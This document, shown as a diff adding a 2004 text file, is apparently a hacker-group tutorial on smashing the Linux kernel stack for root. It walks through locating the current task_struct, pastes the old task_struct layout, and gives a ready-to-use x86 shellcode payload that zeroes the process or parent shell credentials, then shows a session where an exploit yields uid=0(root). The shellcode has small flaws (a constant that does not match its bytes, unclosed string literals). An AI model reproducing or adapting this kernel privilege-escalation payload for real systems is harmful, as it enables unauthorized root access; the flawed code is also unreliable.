@@ -1,0 +1,218 @@
+09.23.2004
+
+
+Hi there!
+
+
+this are some words about smashing the linux kernel stack:
+
+once you get control over the kernel eip you transfer it back
+to a buffer inside your exploit (kernelspace of course can access user space w/o limits) 
+that holds the payload. the bof bugs i'm talking about must be triggered via syscall. 
+
+payload creation:
+
+the payload simply updates our process credentials in the current task_struct and exits
+afterwards. i've tried to find a way to make the kernel return to where the syscall originated
+but on the one hand it is quite complicated and on the other hand not necessary.
+
+obtaining current task_struct turned out to be quite easy as you can see here:
+
+
+0000018f <get_current>:
+ 18f:   55                      push   %ebp
+ 190:   89 e5                   mov    %esp,%ebp
+ 192:   83 ec 04                sub    $0x4,%esp
+ 195:   b8 00 e0 ff ff          mov    $0xffffe000,%eax
+ 19a:   21 e0                   and    %esp,%eax
+ 19c:   89 45 fc                mov    %eax,0xfffffffc(%ebp)
+ 19f:   8b 45 fc                mov    0xfffffffc(%ebp),%eax
+ 1a2:   c9                      leave
+ 1a3:   c3                      ret
+
+
+
+so condensed :
+                 mov    $0xffffe001,%eax
+                 and    %esp,%eax
+
+gives us a pointer to task struct within all (abused) syscalls:
+
+
+struct task_struct {
+        /*
+         * offsets of these are hardcoded elsewhere - touch with care
+         */
+        volatile long state;    /* -1 unrunnable, 0 runnable, >0 stopped */
+        unsigned long flags;    /* per process flags, defined below */
+        int sigpending;
+        mm_segment_t addr_limit;        /* thread address space:
+                                                0-0xBFFFFFFF for user-thead
+                                                0-0xFFFFFFFF for kernel-thread
+                                         */
+        struct exec_domain *exec_domain;
+        volatile long need_resched;
+        unsigned long ptrace;
+
+        int lock_depth;         /* Lock depth */
+
+/*
+ * offset 32 begins here on 32-bit platforms. We keep
+ * all fields in a single cacheline that are needed for
+ * the goodness() loop in schedule().
+ */
+        int counter;
+        int nice;
+        unsigned int policy;
+        struct mm_struct *mm;
+        int has_cpu, processor;
+        unsigned long cpus_allowed;
+        /*
+         * (only the 'next' pointer fits into the cacheline, but
+         * that's just fine.)
+         */
+        struct list_head run_list;
+#ifdef CONFIG_NUMA_SCHED
+        int nid;
+#endif
+        int get_child_timeslice;
+        struct task_struct *next_task, *prev_task;
+        struct mm_struct *active_mm;
+        struct rw_sem_recursor mm_recursor;
+        struct list_head local_pages;
+        unsigned int allocation_order, nr_local_pages;
+
+/* task state */
+        struct linux_binfmt *binfmt;
+        int exit_code, exit_signal;
+        int pdeath_signal;  /*  The signal sent when the parent dies  */
+        /* ??? */
+        unsigned long personality;
+        int did_exec:1;
+        pid_t pid;
+        pid_t pgrp;
+        pid_t tty_old_pgrp;
+        pid_t session;
+        pid_t tgid;
+        /* boolean value for session group leader */
+        int leader;
+        /*
+         * pointers to (original) parent process, youngest child, younger sibling,
+         * older sibling, respectively.  (p->father can be replaced with
+         * p->p_pptr->pid)
+         */
+        struct task_struct *p_opptr, *p_pptr, *p_cptr, *p_ysptr, *p_osptr;
+        struct list_head thread_group;
+
+        /* PID hash table linkage. */
+        struct task_struct *pidhash_next;
+        struct task_struct **pidhash_pprev;
+
+        wait_queue_head_t wait_chldexit;        /* for wait4() */
+        struct completion *vfork_done;          /* for vfork() */
+        unsigned long rt_priority;
+        unsigned long it_real_value, it_prof_value, it_virt_value;
+        unsigned long it_real_incr, it_prof_incr, it_virt_incr;
+        struct timer_list real_timer;
+        struct tms times;
+        unsigned long start_time;
+        long per_cpu_utime[NR_CPUS], per_cpu_stime[NR_CPUS];
+/* mm fault and swap info: this can arguably be seen as either mm-specific
+or thread-specific */
+        unsigned long min_flt, maj_flt, nswap, cmin_flt, cmaj_flt, cnswap;
+        int swappable:1;
+/* process credentials */
+        uid_t uid,euid,suid,fsuid;
+        gid_t gid,egid,sgid,fsgid;
+        int ngroups;
+        gid_t   groups[NGROUPS];
+        kernel_cap_t   cap_effective, cap_inheritable, cap_permitted;
+        int keep_capabilities:1;
+        struct user_struct *user;
+/* limits */
+        struct rlimit rlim[RLIM_NLIMITS];
+        unsigned short used_math;
+        char comm[16];
+/* file system info */
+        int link_count;
+        struct tty_struct *tty; /* NULL if no tty */
+        unsigned int locks; /* How many file locks are being held */
+/* ipc stuff */
+        struct sem_undo *semundo;
+        struct sem_queue *semsleeping;
+/* CPU-specific state of this task */
+        struct thread_struct thread;
+/* filesystem information */
+        struct fs_struct *fs;
+/* open file information */
+        struct files_struct *files;
+/* signal handlers */
+        spinlock_t sigmask_lock;        /* Protects signal and blocked */
+        struct signal_struct *sig;
+
+        sigset_t blocked;
+        struct sigpending pending;
+
+        unsigned long sas_ss_sp;
+        size_t sas_ss_size;
+        int (*notifier)(void *priv);
+        void *notifier_data;
+        sigset_t *notifier_mask;
+
+        /* TUX state */
+        void *tux_info;
+        void (*tux_exit)(void);
+
+/* Thread group tracking */
+        u32 parent_exec_id;
+        u32 self_exec_id;
+/* Protection of (de-)allocation: mm, files, fs, tty */
+        spinlock_t alloc_lock;
+
+/* journalling filesystem info */
+        void *journal_info;
+};
+
+
+then we simply move a 0x00 at the offset of our credentials euid, uid, egid and gid
+in order to give us root.
+afterwards we simply call exit and stop our kernel process to avoid noisy Oops.
+
+the code below gives root to the parent process (->shell) of your exploit with the line 
+mov    0x9c(%eax),%eax.
+leave it out and only your exploit will gain root privs..it's a matter of taste and the 
+situation. 
+
+
+the finished playload (as it does not have to be strcpy()'d w/ NULLs...) looks as follows:
+
+char k_give_root[] =  //----[ linux/x86 ]-----\\
+                      \\----qobaiashi/UNF-----//
+"\x31\xf6"                //      xor    %esi,%esi
+"\xb8\x00\xe0\xff\xff"    //      mov    $0xffffe001,%eax
+"\x48"                    //      dec    %eax
+"\x21\xe0"                //      and    %esp,%eax
+//leave the next line out if only your exploit should become root
+"\x8b\x80\x9c\x00\x00\x00"//      mov    0x9c(%eax),%eax  eax=ptr-to->parents->task_struct
+"\x89\xb0\x30\x01\x00\x00"//      mov    %esi,0x130(%eax)
+"\x89\xb0\x34\x01\x00\x00"//      mov    %esi,0x134(%eax)
+"\x89\xb0\x40\x01\x00\x00"//      mov    %esi,0x140(%eax)
+"\x89\xb0\x44\x01\x00\x00"//      mov    %esi,0x144(%eax)
+"\x31\xc0                 //      xor    %eax,%eax
+"\x40                     //      inc    %eax
+"\xcd\x80";               //      int    $0x80
+
+
+=>
+Exploiting a (self made) kernel bug:
+
+
+qobaiashi@cocoon:~/w00nf/kernelsploit> ./kexpl
+payload[113] is at [0x80496c0]
+overflow buffer is at 0xbffff250
+qobaiashi@cocoon:~/w00nf/kernelsploit> id
+uid=0(root) gid=0(root) Gruppen=100(users)
+qobaiashi@cocoon:~/w00nf/kernelsploit>
+
+
+-q
